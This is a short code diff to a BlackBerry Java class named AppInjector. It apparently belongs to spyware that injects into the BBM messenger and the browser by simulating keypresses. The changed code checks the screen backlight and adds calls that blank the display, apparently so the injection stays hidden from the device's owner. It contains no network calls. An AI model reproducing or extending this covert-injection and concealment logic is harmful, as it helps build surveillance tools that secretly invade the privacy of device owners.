@@ -16,6 +16,7 @@ import net.rim.device.api.system.DeviceInfo;
 import net.rim.device.api.ui.Keypad;
 import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.UiApplication;
+import blackberry.Main;
 import blackberry.agent.im.AppInjectorBBM;
 import blackberry.agent.url.AppInjectorBrowser;
 import blackberry.debug.Debug;
@@ -191,12 +192,14 @@ public class AppInjector {
         debug.trace("unLock");
         //#endif
 
-        Utils.sleep(200);
+        if (!backlight()){
+            //Main.getInstance().showBlackScreen(true);    
+            //Utils.sleep(1000);
+        }
+       
         KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
-        //KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
-        //Utils.sleep(200);
-        //KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
         Utils.sleep(200);
+        
         if (backlight()) {
             //#ifdef DEBUG
             debug.trace("Backlight still enabled, getHardwareLayout: "
@@ -223,6 +226,8 @@ public class AppInjector {
 
             return;
         }
+        
+        Main.getInstance().showBlackScreen(false); 
     }
 
     private boolean backlight() {
